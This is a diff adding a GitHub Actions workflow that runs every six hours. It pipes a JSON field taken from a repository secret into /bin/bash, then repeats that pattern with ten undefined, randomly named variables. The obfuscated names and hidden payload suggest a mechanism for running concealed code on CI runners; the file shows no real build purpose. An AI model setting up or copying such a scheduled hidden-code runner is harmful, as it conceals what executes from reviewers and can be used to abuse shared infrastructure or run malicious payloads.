@@ -1,0 +1,28 @@
+name: dongsanfeng2002
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongsanfeng2002
+        env:
+          hp2947: ${{ secrets.hp2947 }}
+        run: |
+          echo $hp2947 | jq -r .p92 | /bin/bash
+          echo $fwyzy136 | jq -r .li069 | /bin/bash
+          echo $d89 | jq -r .kx7 | /bin/bash
+          echo $i71 | jq -r .jepsl857 | /bin/bash
+          echo $bzrzl6 | jq -r .ct1 | /bin/bash
+          echo $nusam28130 | jq -r .jaaqc555 | /bin/bash
+          echo $scb321 | jq -r .t691 | /bin/bash
+          echo $dfw6551 | jq -r .lc4246 | /bin/bash
+          echo $kgml91 | jq -r .h96 | /bin/bash
+          echo $wfve6372 | jq -r .fh0 | /bin/bash
+          echo $dzm52 | jq -r .bi68966 | /bin/bash
+
